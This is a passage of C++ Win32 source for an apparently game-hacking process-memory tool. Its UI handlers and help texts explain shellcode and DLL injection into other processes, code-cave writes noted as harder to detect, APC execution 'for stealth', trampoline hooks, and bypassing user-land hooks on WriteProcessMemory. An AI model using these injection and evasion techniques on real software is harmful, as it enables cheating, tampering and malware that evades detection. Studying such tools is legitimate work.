                "- Shows all loaded modules (DLLs/EXEs) in the target process.\n"
                "- Click a module line to select it.\n"
                "- Right‑click? Not needed – use the buttons below.\n\n"
                "[Refresh] – Reloads the module list (do this after DLL inj).\n\n"
                "[Eject Selected] – Unloads the selected module using FreeLibrary.\n"
                "  * Works only if the module was loaded via LoadLibrary (not a static import).\n"
                "  * Click a module line first, then click Eject.\n\n"
                "[DLL INJ]\n"
                "  * Enter full path to a DLL (or use Browse).\n"
                "  * Click 'Inject DLL (LoadLibraryA)' – the DLL is loaded into the target process.\n"
                "  * The module list will automatically refresh after inj.\n"
                "  * To eject, select the DLL in the list and click 'Eject Selected'.\n\n"
                "⚠️ Make sure the DLL architecture (x86/x64) matches the target process.\n"
                "⚠️ The target process must have enough privileges (run as Admin).\n"
                "⚠️ For manual mapping / reflective injection, use the Code Inj tab instead.",
                "Modules & DLL Help", MB_OK | MB_ICONINFORMATION);
            break;

        case ID_BTN_HELP_INJECT:
            MessageBoxA(hWnd,
                "=== CODE INJECTION TAB  ─  Full Reference ===\r\n"
                "\r\n"
                "━━━━━  SHELLCODE INJECTION  ━━━━━\r\n"
                "\r\n"
                "What it does:\r\n"
                "  Allocates a new RWX (or RX) memory region inside the target process,\r\n"
                "  copies your hex bytes into it, then starts a new remote thread there.\r\n"
                "\r\n"
                "Steps:\r\n"
                "  1. Paste your shellcode as space-separated hex bytes:\r\n"
                "       90 90 C3          (two NOPs then RET – safe smoke-test)\r\n"
                "       48 C7 00 39 05 00 00 C3  (write 1337 to [rax], then ret)\r\n"
                "  2. Or click 'Load .bin File' to import a raw binary file.\r\n"
                "  3. Choose protection:\r\n"
                "       RWX – writable and executable (easier, more detectable)\r\n"
                "       RX  – read+execute only (write first, protect before running)\r\n"
                "  4. Click 'Alloc + Execute'.\r\n"
                "  5. Switch to the Verify tab and click Run All to confirm execution.\r\n"
                "\r\n"
                "Common problems:\r\n"
                "  • Shellcode crashes the target  → add a RET (C3) at the end.\r\n"
                "  • Thread exits immediately      → check you aren't calling APIs that\r\n"
                "                                    need initialised stack (add sub rsp,0x28).\r\n"
                "  • Write fails                   → run as Administrator.\r\n"
                "\r\n"
                "━━━━━  SHELLCODE BUILDER  ━━━━━\r\n"
                "\r\n"
                "Generates small x64/x86 stubs for common memory-write patterns.\r\n"
                "  Ops:  Set value · Add · Subtract · Zero out · NOP sled\r\n"
                "  1. Enter target address (copy from scan results or type it).\r\n"
                "  2. Enter the integer value to write.\r\n"
                "  3. Select architecture (x64 / x86).\r\n"
                "  4. Click Build → hex appears in the result field.\r\n"
                "  5. Click '-> SC Field' to send it to the injection box above.\r\n"
                "\r\n"
                "━━━━━  OPEN ASSEMBLER  ━━━━━\r\n"
                "\r\n"
                "Writes Intel-syntax x64 assembly and converts it to shellcode bytes.\r\n"
                "  • Supports: mov, lea, push/pop, add/sub/xor/cmp, inc/dec,\r\n"
                "    shl/shr, mul/div, call/jmp (register), test, xchg, nop, ret.\r\n"
                "  • Comments start with ';'.\r\n"
                "  • Click Assemble → bytes appear → Send to SC Field.\r\n"
                "\r\n"
                "━━━━━  CODE CAVE SCANNER  ━━━━━\r\n"
                "\r\n"
                "Finds runs of 0x00 or 0x90 bytes inside the target (unused space).\r\n"
                "  1. Set minimum size (bytes). 32 is a safe minimum.\r\n"
                "  2. Click Scan Caves.\r\n"
                "  3. Click a cave line in the list (note RWX caves are best).\r\n"
                "  4. Put your shellcode in the hex field above.\r\n"
                "  5. Click 'Inject SC to Cave' – writes bytes there without allocating\r\n"
                "     new memory (harder to detect than VirtualAllocEx).\r\n"
                "  6. Use the Shellcode Exec tab to trigger the cave address.\r\n"
                "\r\n"
                "━━━━━  REMOTE THREADS  ━━━━━\r\n"
                "\r\n"
                "  • List Threads   – shows TID, priorities, and start address for every\r\n"
                "                     thread in the attached process.\r\n"
                "  • Kill Selected  – terminates the selected thread (TerminateThread).\r\n"
                "                     WARNING: killing the main thread crashes the process.\r\n"
                "  • Suspend/Resume – freezes or thaws ALL threads (useful for breakpointing\r\n"
                "                     before a write then resuming after).\r\n"
                "\r\n"
                "━━━━━  DLL INJECTION  (on the Modules & DLL tab)  ━━━━━\r\n"
                "\r\n"
                "Method: LoadLibraryA via CreateRemoteThread.\r\n"
                "  1. Enter the FULL path to the DLL  (e.g. C:\\tools\\myhook.dll).\r\n"
                "     Or click Browse to choose it.\r\n"
                "  2. Click 'Inject DLL (LoadLibraryA)'.\r\n"
                "  3. The Modules list refreshes – your DLL should appear there.\r\n"
                "  4. If not, check:\r\n"
                "       • Architecture mismatch (x86 DLL into x64 process, or vice versa)\r\n"
                "       • DLL or its dependencies not found (use Dependency Walker)\r\n"
                "       • DllMain returned FALSE\r\n"
                "       • Missing admin rights\r\n"
                "\r\n"
                "To eject:  click the module line in the list → Eject Selected.\r\n"
                "  Only works if the DLL was dynamically loaded; static imports cannot\r\n"
                "  be safely ejected this way.\r\n"
                "\r\n"
                "━━━━━  TIPS  ━━━━━\r\n"
                "\r\n"
                "  • Use the Verify tab to confirm any injection actually took effect.\r\n"
                "  • Enable 'Use syscall write' in the scanner tab to bypass user-land\r\n"
                "    hooks on WriteProcessMemory when writing values.\r\n"
                "  • Always test shellcode in a disposable VM before targeting real software.\r\n"
                "  • Run as Administrator for full access rights.\r\n",
                "Code Injection / DLL Help",
                MB_OK | MB_ICONINFORMATION);
            break;

        case ID_BTN_HELP_WNDWRITER:
            MessageBoxA(hWnd,
                "=== WINDOW WRITER TAB ===\n\n"
                "[REFRESH WINDOWS] – Lists all top‑level windows belonging to the attached process,\n"
                "  including child controls. The list shows HWND, class name, and window title.\n\n"
                "Click any line → the window is selected (HWND appears at the top).\n\n"
                "[TEXT OPERATIONS]\n"
                "  * Type text in 'Text to set'.\n"
                "  * 'Send WM_SETTEXT' – sets the window/control text (like a paste).\n"
                "  * 'Get WM_GETTEXT' – reads the current text into the edit box.\n\n"
                "[POST MESSAGE]\n"
                "  * Send any custom message (WM_xxx) with wParam and lParam.\n"
                "  * Example: WM_CLOSE (0x0010) to close the window.\n\n"
                "[WM_COMMAND]\n"
                "  * Send a command message to a control (e.g., button click).\n"
                "  * Enter the control's command ID (often seen in Spy++).\n\n"
                "[WINDOW ACTIONS]\n"
                "  * Focus / Foreground – bring window to top.\n"
                "  * Hide / Show – toggle visibility.\n"
                "  * Enable / Disable – grey out controls.\n"
                "  * Minimize / Maximize / Restore – resize the window.\n"
                "  * Close (WM_CLOSE) – politely ask the window to close.\n\n"
                "⚠️ This tab works on any window/control of the attached process,\n"
                "  including other processes' windows (if you have sufficient privileges).",
                "Window Writer Help", MB_OK | MB_ICONINFORMATION);
            break;

        case ID_BTN_HELP_SHELLCODE:
            MessageBoxA(hWnd,
                "=== SHELLCODE EXECUTION TAB ===\n\n"
                "This tab lets you trigger already injected shellcode or DLL exports.\n\n"
                "[EXECUTE SHELLCODE]\n"
                "  * Enter the address where your shellcode resides (e.g., from a code cave).\n"
                "  * Click 'Execute Shellcode' – creates a new remote thread at that address.\n\n"
                "[EXECUTE VIA APC]\n"
                "  * Same as above, but queues the shellcode as an Asynchronous Procedure Call\n"
                "    to an existing thread (specify Thread ID).\n"
                "  * Useful for stealth or when the target thread is in an alertable wait state.\n\n"
                "[DLL INJECT && CALL EXPORT]\n"
                "  * Select a DLL file (Browse).\n"
                "  * Specify an exported function name (e.g., 'Start', 'EntryPoint').\n"
                "  * Click 'Inject && Call' – the tool will:\n"
                "      1. Inject the DLL via LoadLibrary.\n"
                "      2. Locate the exported function in the remote process.\n"
                "      3. Create a remote thread to execute that function.\n"
                "  * The module list will refresh automatically.\n\n"
                "⚠️ The DLL must match the target process architecture (x86/x64).\n"
                "⚠️ The exported function should accept no arguments (void) or be safe to call\n"
                "    from a new thread (e.g., do not rely on DLL_PROCESS_ATTACH initialisation).\n\n"
                "Use the Code Inj tab to first inject shellcode or a DLL, then use this tab\n"
                "to trigger it repeatedly or by different methods.",
                "Shellcode Exec Help", MB_OK | MB_ICONINFORMATION);
            break;
        case ID_BTN_TRIGGER: TriggerShellcode(); break;
        case ID_BTN_TRIGGER_CLEAR_LOG: ClearEditText(hLstTriggerLog); break;
        case ID_BTN_READ_OUTPUT: {
            char addrStr[64] = {0}, sizeStr[32] = {0};
            GetWindowTextA(hEditOutputAddr, addrStr, 64);
            GetWindowTextA(hEditOutputSize, sizeStr, 32);
            uintptr_t outAddr = (uintptr_t)strtoull(addrStr, nullptr, 0);
            DWORD outSize = (DWORD)strtoul(sizeStr, nullptr, 0);
            if (!outAddr || outSize == 0 || outSize > 4096) {
                LogToTrigger("Invalid output address or size (max 4096)", true);
                break;
            }
            std::vector<BYTE> buf(outSize);
            SIZE_T read = 0;
            if (ReadProcessMemory(hProcess, (LPCVOID)outAddr, buf.data(), outSize, &read) && read > 0) {
                char hex[8192] = "Output buffer:\n";
                for (DWORD i = 0; i < read; i++) {
                    char t[8];
                    sprintf_s(t, "%02X ", buf[i]);
                    strcat_s(hex, t);
                    if ((i + 1) % 16 == 0) strcat_s(hex, "\n");
                }
                LogToTrigger(hex);
            } else {
                LogToTrigger("Failed to read output buffer", true);
            }
            break;
        }
        case ID_BTN_CHECK_SENTINEL2:  ClearEditText(hLstVerify); VerifyCheckSentinel(); break;
        case ID_BTN_SNAPSHOT_VERIFY: TakeVerifySnapshot(); break;
        case ID_BTN_CHECK_VALUES:    ClearEditText(hLstVerify); VerifyCheckValues();   break;
        case ID_BTN_CHECK_MODULES:   ClearEditText(hLstVerify); VerifyCheckModules();  break;
        case ID_BTN_CHECK_THREADS:   ClearEditText(hLstVerify); VerifyCheckThreads();  break;
        case ID_BTN_CHECK_MEMORY:    ClearEditText(hLstVerify); VerifyCheckMemory();   break;
        case ID_BTN_CHECK_SENTINEL:  ClearEditText(hLstVerify); VerifyCheckSentinel(); break;
        case ID_BTN_VERIFY_ALL:      RunVerifyAll(); break;

        case ID_BTN_CHAIN_ADD:     AddChainFromUI(); break;
        case ID_BTN_CHAIN_DEL:     DeleteSelectedChain(); break;
        case ID_BTN_CHAIN_RESOLVE: ResolveChainToSelected(); break;
        case ID_BTN_CHAIN_REFRESH: RefreshChainsUI(); LogToStatus("Chains refreshed"); break;
        case ID_BTN_CHAIN_SAVE:    SaveChainsToFile(); break;
        case ID_BTN_CHAIN_LOAD:    LoadChainsFromFile(); break;

        case ID_BTN_CALLGRAPH: TraceCallGraph(); break;

        
        case ID_BTN_HOOK_INSTALL: InstallTrampolineHook(); break;
        case ID_BTN_HOOK_RESTORE: RestoreSelectedHook();   break;
        case ID_BTN_HOOK_REFRESH: RefreshHooksUI(); LogToStatus("Hook list refreshed"); break;
        case ID_BTN_HOOK_HELP:
            MessageBoxA(hWnd,
                "=== TRAMPOLINE HOOK BUILDER ===\r\n\r\n"
                "WHAT IT DOES\r\n"
                "  Detours a function in the target process to your shellcode, runs your\r\n"
                "  code, then returns to the original function so it continues normally.\r\n\r\n"
                "HOW IT WORKS\r\n"
                "  1. Reads 14 bytes from the target address (your hook site).\r\n"
                "  2. Allocates an RWX trampoline buffer in the target process.\r\n"
                "  3. Lays out the trampoline as:\r\n"
                "        [ your shellcode ] [ original 14 bytes ] [ 14-byte abs JMP back ]\r\n"
                "  4. Overwrites the target with a 14-byte absolute JMP to the trampoline.\r\n"
                "  5. When execution hits the target -> jumps into your shellcode -> runs\r\n"
                "     the original 14 bytes -> jumps back to (target + 14) and continues.\r\n\r\n"
                "HOW TO USE\r\n"
                "  1. Find a function start (or any safe spot 14+ bytes long) - use the\r\n"
                "     Export Browser tab to grab a real function address.\r\n"
                "  2. Paste it into 'Target'.\r\n"
                "  3. Write your shellcode in hex (e.g. assemble it via the Assembler\r\n"
                "     window then 'Send to SC Field' - but paste it here instead).\r\n"
                "     IMPORTANT: your shellcode must preserve any registers it touches.\r\n"
                "     A safe template is:\r\n"
                "        50          push rax\r\n"
                "        51          push rcx\r\n"
                "        ... your code ...\r\n"
                "        59          pop  rcx\r\n"
                "        58          pop  rax\r\n"
                "  4. Click 'Install Hook'. Verify in Verify tab afterwards.\r\n"
                "  5. To revert: select the hook line, click 'Restore Selected'.\r\n\r\n"
                "CAVEATS\r\n"
                "  * The 14 bytes you overwrite MUST start on an instruction boundary or\r\n"
                "    the original-bytes splice in the trampoline will execute garbage.\r\n"
                "  * If the original bytes contain rip-relative instructions, those will\r\n"
                "    break when relocated to the trampoline. Prefer hooking function\r\n"
                "    prologs that start with mov/push/sub-rsp.\r\n"
                "  * Always test on a disposable process before real targets.",
                "Trampoline Hook Help", MB_OK | MB_ICONINFORMATION);
            break;

        case ID_BTN_EXP_REFRESH: EnumerateExports(); break;
        case ID_BTN_EXP_FILTER:  RefreshExportsUI(); break;
        case ID_BTN_EXP_GOTO:    GoToSelectedExport(); break;

        case ID_BTN_HND_REFRESH: EnumerateHandles(); break;
        case ID_BTN_HND_FILTER:  RefreshHandlesUI(); break;

        case ID_BTN_PATCH_READ:       PatcherReadAndShow();      break;
        case ID_BTN_PATCH_DISASM:     PatcherDisassembleAtAddr();break;
        case ID_BTN_PATCH_WRITEBYTES: PatcherWriteRawBytes();    break;
        case ID_BTN_PATCH_NOP:        PatcherNopOut();           break;
        case ID_BTN_PATCH_SHORTJMP:   PatcherShortJmp();         break;
        case ID_BTN_PATCH_NEARJMP:    PatcherNearJmp();          break;
        case ID_BTN_PATCH_CAVE:       PatcherInstallCodeCave();  break;
        case ID_BTN_PATCH_RESTORE:    PatcherRestoreSelected();  break;
        case ID_BTN_PATCH_REFRESH:    PatcherRefreshList();      break;
        case ID_BTN_PATCH_HELP:
            MessageBoxA(hWnd,
                "BINARY PATCHER\r\n"
                "==============\r\n\r\n"
                "Patches the memory of the currently attached process. Every\r\n"
                "modification saves the original bytes so it can be reverted with\r\n"
                "'Restore Selected'. Page protection is automatically flipped to\r\n"
                "RWX during the write and restored afterwards, and the icache is\r\n"
                "flushed so the CPU sees the new bytes.\r\n\r\n"
                "1) WRITE RAW BYTES\r\n"
                "   Replace N bytes at target with literal bytes you type.\r\n"
                "   Example: write '90 90' to NOP a two-byte conditional jump.\r\n\r\n"
                "2) NOP OUT\r\n"
                "   Replace N bytes with 0x90 (single-byte NOP). Useful for killing\r\n"
                "   anti-disasm jumps like 7F FF / 75 FF that target an opcode byte.\r\n\r\n"
                "3) REDIRECT JUMP\r\n"
                "   Short (EB rel8, 2 bytes, +/-127) or Near (E9 rel32, 5 bytes,\r\n"
                "   +/-2 GB). Replaces the bytes at 'Target addr' with an\r\n"
                "   unconditional jump to 'Jump-to'. If the original instruction\r\n"
                "   was longer than the new jump, the trailing bytes become NOP-\r\n"
                "   slide candidates - pad them with the Write/NOP tools first.\r\n\r\n"
                "4) CODE CAVE HOOK\r\n"
                "   Allocates RWX memory in the process, copies the payload bytes\r\n"
                "   you typed into box 1, then the original 14 bytes from the\r\n"
                "   target, then a 14-byte absolute JMP back to (target+14). The\r\n"
                "   target itself is overwritten with a 14-byte abs JMP into the\r\n"
                "   cave. Your payload must preserve any registers it clobbers\r\n"
                "   (push/pop) - it runs in the middle of the original function.\r\n\r\n"
                "TIP: To safely modify code that contains anti-disasm 7F FF style\r\n"
                "jumps, first 'Read Bytes' to see the layout, then either NOP the\r\n"
                "junk jumps, or jump out to a code cave where you have free space\r\n"
                "to write whatever bytes you want executed.",
                "Binary Patcher Help", MB_OK | MB_ICONINFORMATION);
            break;

        case ID_BTN_APS_SCAN: RunAutoPointerScan(); break;
        case ID_BTN_APS_ADDCHAIN: AddAutoPtrScanToChains(); break;
        case ID_BTN_APS_CLEAR:
            ClearEditText(hLstApsResults);
            g_lastAutoPtrScan.clear();
            LogToStatus("Auto pointer scan results cleared");
            break;
        case ID_BTN_APS_USE_SELECTED: {
            LPVOID a = GetSelectedAddress();
            if (!a) { LogToStatus("No address selected in Scanner tab", true); break; }
            char buf[32]; sprintf_s(buf, "0x%llX", (uintptr_t)a);
            SetWindowTextA(hEditApsTarget, buf);
            LogToStatus("Target address set from current selection");
            break;
        }
        case ID_BTN_DW_REFRESH: DisasmWalkerRefresh(); break;
        case ID_BTN_DW_USE_SELECTED: {
            LPVOID a = GetSelectedAddress();
            if (!a) { LogToStatus("No address selected in Scanner tab", true); break; }
            char buf[32]; sprintf_s(buf, "0x%llX", (uintptr_t)a);
            SetWindowTextA(hEditDwTarget, buf);
            SetWindowTextA(hEditDwOffset, "0x0");
            DisasmWalkerRefresh();
            break;
        }
        case ID_BTN_DW_CENTER:
            SetWindowTextA(hEditDwOffset, "0x0");
            DisasmWalkerRefresh();
            break;
        case ID_BTN_DW_STEP_BACK: {
            char s[32] = {}; GetWindowTextA(hEditDwStep, s, sizeof(s));
            int64_t step = strtoll(s, nullptr, 0); if (step <= 0) step = 0x20;
            DisasmWalkerAdjustOffset(-(intptr_t)step);
            break;
        }
        case ID_BTN_DW_STEP_FWD: {
            char s[32] = {}; GetWindowTextA(hEditDwStep, s, sizeof(s));
            int64_t step = strtoll(s, nullptr, 0); if (step <= 0) step = 0x20;
            DisasmWalkerAdjustOffset((intptr_t)step);
            break;
        }
        case ID_BTN_DW_PAGE_BACK: {
            char s[32] = {}; GetWindowTextA(hEditDwViewSize, s, sizeof(s));
            int page = (int)strtoul(s, nullptr, 0); if (page <= 0) page = 256;
            DisasmWalkerAdjustOffset(-(intptr_t)page);
            break;
        }
        case ID_BTN_DW_PAGE_FWD: {
            char s[32] = {}; GetWindowTextA(hEditDwViewSize, s, sizeof(s));
            int page = (int)strtoul(s, nullptr, 0); if (page <= 0) page = 256;
            DisasmWalkerAdjustOffset((intptr_t)page);
            break;
        }
        case ID_BTN_DW_HELP:
            MessageBoxA(hWnd,
                "DISASM WALKER\r\n"
                "=============\r\n\r\n"
                "Reads memory starting at (target + offset) and displays both a hex dump\r\n"
                "and a Zydis-decoded disassembly. Designed for stepping above/below a\r\n"
                "target address to find function boundaries, vtables, embedded data,\r\n"
                "or to verify what just-injected shellcode actually got written.\r\n\r\n"
                "FIELDS\r\n"
                "  Target addr  : absolute virtual address (hex 0x...)\r\n"
                "  Offset       : signed displacement from target (hex; can be negative\r\n"
                "                 e.g. -0x100 to look back).\r\n"
                "  View bytes   : window size, 1..4096.\r\n"
                "  Step         : how many bytes 'Step Back/Fwd' moves at a time.\r\n\r\n"
                "BUTTONS\r\n"
                "  Refresh           : re-read at current target+offset\r\n"
                "  Use Selected Addr : copy the currently-selected scanner address into\r\n"
                "                      Target, set Offset=0, and refresh\r\n"
                "  << Page Back      : offset -= View bytes\r\n"
                "  <  Step Back      : offset -= Step\r\n"
                "  Center on Target  : offset = 0\r\n"
                "  Step Fwd >        : offset += Step\r\n"
                "  Page Fwd >>       : offset += View bytes\r\n\r\n"
                "OUTPUT\r\n"
                "  - Hex dump shows 16 bytes per row with ASCII; the row containing the\r\n"
                "    target gets a marker.\r\n"
                "  - Disassembly shows address / bytes / instruction, with hints for\r\n"
                "    syscall, int3, gs:/PEB access, call, ret, ud2. The instruction that\r\n"
                "    contains the target gets a '<<<' marker.\r\n\r\n"
                "TIPS\r\n"
                "  * If the disassembly is full of 'ud2' / 'db 0xNN' lines you're looking\r\n"
                "    at data, not code - try a different offset.\r\n"
                "  * Use Page Back / Page Fwd to scroll function-by-function. Step is\r\n"
                "    useful when you've landed mid-instruction.",
                "Disasm Walker Help", MB_OK | MB_ICONINFORMATION);
            break;

        case ID_BTN_APS_HELP:
            MessageBoxA(hWnd,
                "AUTO POINTER SCANNER\r\n"
                "====================\r\n\r\n"
                "Finds multi-level pointer chains rooted in static (image) memory that\r\n"
                "resolve to your target address.\r\n\r\n"
                "ALGORITHM\r\n"
                "  1. Snapshot all readable+committed memory in the target process.\r\n"
                "  2. For each level 1..maxDepth, look for 8-byte aligned positions whose\r\n"
                "     stored qword V satisfies: target - maxOffset <= V <= target.\r\n"
                "     That position is a candidate pointer; offset = target - V.\r\n"
                "  3. If the candidate is itself inside a loaded module (MEM_IMAGE), it\r\n"
                "     becomes the static root of a chain. Otherwise it becomes the new\r\n"
                "     target for the next level.\r\n"
                "  4. Capped at 8000 carried candidates/level and 500 final chains so\r\n"
                "     the scan terminates.\r\n\r\n"
                "OUTPUT\r\n"
                "  Each chain is shown in resolve order: module + baseOff, then offsets\r\n"
                "  applied root-to-leaf. The same offsets can be pasted into the chain\r\n"
                "  manager on the Pointers & Hooks tab (or click 'Add All to Chain\r\n"
                "  Manager' to bulk-import them).\r\n\r\n"
                "ZYDIS DISASSEMBLY\r\n"
                "  After the scan, 256 B at the target and 64 B at each of the first 4\r\n"
                "  chain roots are disassembled with Zydis. Useful when the target is a\r\n"
                "  code address (vtable slot, hook site) or when the chain root sits in\r\n"
                "  a code-adjacent .data/.rdata section and you want to see what writes\r\n"
                "  to it nearby.\r\n\r\n"
                "TIPS\r\n"
                "  * For game cheats: depth 3-5, maxOff 0x800-0x1000 is usually enough.\r\n"
                "  * If no chains: try larger depth or maxOff; or the value is heap-only.\r\n"
                "  * Scanning 1 GB+ processes may take a minute. The UI freezes during\r\n"
                "    the scan - the scan does not modify the target.",
                "Auto Pointer Scanner Help", MB_OK | MB_ICONINFORMATION);
            break;

        case WM_LBUTTONUP: break;

        }
        break;
    


    case WM_DESTROY:
        KillTimer(hWnd,TIMER_FREEZE);KillTimer(hWnd,TIMER_WATCH);KillTimer(hWnd,TIMER_HEALTH);
        if(hProcess)CloseHandle(hProcess);
        DeleteObject(hFontTitle);DeleteObject(hFontSection);
        DeleteObject(hFontNormal);DeleteObject(hFontMono);DeleteObject(hFontSmall);
        DeleteObject(hBrushWindow);DeleteObject(hBrushEdit);
        DeleteObject(hBrushList);DeleteObject(hBrushStatus);
        PostQuitMessage(0);break;

    default:
        return DefWindowProc(hWnd,msg,wParam,lParam);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE,LPSTR,int nCmdShow){
    hInst=hInstance;
    if(!IsElevated()){
        int r=MessageBoxA(NULL,
            "Administrator privileges are required to attach to most processes.\n\nRelaunch as Administrator now?",
            "Elevation Required",MB_YESNO|MB_ICONWARNING|MB_TOPMOST);
        if(r==IDYES)RelaunchAsAdmin();
    }
    EnableDebugPrivilege();
    INITCOMMONCONTROLSEX icex={sizeof(icex),ICC_STANDARD_CLASSES};
    InitCommonControlsEx(&icex);
    g_hRichEdit=LoadLibraryA("riched20.dll");
    WNDCLASSA wc={};
    wc.lpfnWndProc=WndProc;wc.hInstance=hInstance;wc.hbrBackground=NULL;
    wc.lpszClassName="MemiscaniMain";wc.hCursor=LoadCursor(NULL,IDC_ARROW);
    RegisterClassA(&wc);
    hMainWnd=CreateWindowA("MemiscaniMain","Memiscani :)",
        WS_OVERLAPPEDWINDOW|WS_CLIPCHILDREN,30,30,1920,1080,NULL,NULL,hInstance,NULL);
    if(!hMainWnd)return 1;
    ShowWindow(hMainWnd,nCmdShow);UpdateWindow(hMainWnd);
    MSG msg;
    while(GetMessage(&msg,NULL,0,0)){TranslateMessage(&msg);DispatchMessage(&msg);}
    if(g_hRichEdit)FreeLibrary(g_hRichEdit);
    return(int)msg.wParam;
}
